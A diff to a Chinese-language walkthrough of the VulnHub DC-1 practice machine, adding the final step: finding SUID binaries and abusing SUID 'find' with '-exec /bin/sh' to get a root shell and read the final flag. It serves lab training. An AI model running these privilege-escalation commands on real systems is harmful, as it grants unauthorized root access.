@@ -158,9 +158,20 @@ Probably. But perhaps it's not that easy.  Or maybe it is?
 
 考点：find的suid提权
 
+```bash
+find / -perm -u=s -type f 2>/dev/null
 
+两种方法：
+find . -exec /bin/sh \;  # 直接提权
+find flag4.txt -exec "/bin/sh" \; # x
+ls /root
+cat /root/thefinalflag.txt
+```
 
+![image](./img/vulnhub-dc1-13.png)
+![image](./img/vulnhub-dc1-14.png)
+
+提权成功，得到flag5
 ## 参考链接
 - https://github.com/ffffffff0x/1earn/blob/004fbc731d7ce8004b9c2a38613d39f71cd8cb6e/1earn/Security/%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E9%9D%B6%E6%9C%BA/VulnHub/DC/DC1-WalkThrough.md
 - https://peiqiwiki.yuque.com/staff-ws572w/ku05f9/kh0cna
-- 『VulnHub系列』DC_%201-Walkthrough.pdf
